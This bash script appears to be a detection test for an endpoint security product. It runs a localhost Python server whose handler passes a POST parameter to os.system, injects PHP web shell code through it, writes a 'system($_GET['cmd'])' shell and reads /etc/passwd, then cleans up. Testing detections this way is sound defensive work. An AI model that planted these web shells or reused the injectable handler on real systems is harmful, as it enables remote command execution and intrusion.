#!/bin/bash
# 07 - Webshell via Command Injection
# Trigger: LinWebshell + WebshellLinSession IOA
# Tactic: Persistence / Web Shell
set -e
echo "=== [07] Webshell (Command Injection) ==="

# Start a lightweight Python HTTP server in background
mkdir -p /tmp/webroot/uploads
cat > /tmp/webroot/app.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, subprocess, os

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        cmd = params.get("cmd", [""])[0]
        # Simulate command injection writing a webshell
        if cmd:
            os.system(cmd)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args):
        pass

HTTPServer(("127.0.0.1", 8888), Handler).handle_request()
PYEOF

# Start server
python3 /tmp/webroot/app.py &
SERVER_PID=$!
sleep 1

# Inject webshell via POST command injection
curl -s -X POST http://127.0.0.1:8888/ \
  -d "cmd=echo '<?php shell_exec(\"whoami\");?>' > /tmp/webroot/uploads/test.php" \
  2>/dev/null || true

# Execute webshell-like commands
sh -c 'echo "<?php system(\$_GET[\"cmd\"]);?>" > /tmp/webroot/uploads/shell.php' 2>/dev/null || true
sh -c 'cat /etc/passwd' 2>/dev/null || true

# Cleanup
kill $SERVER_PID 2>/dev/null || true
rm -rf /tmp/webroot 2>/dev/null || true

echo "[07] Done — LinWebshell + WebshellLinSession IOA should trigger"
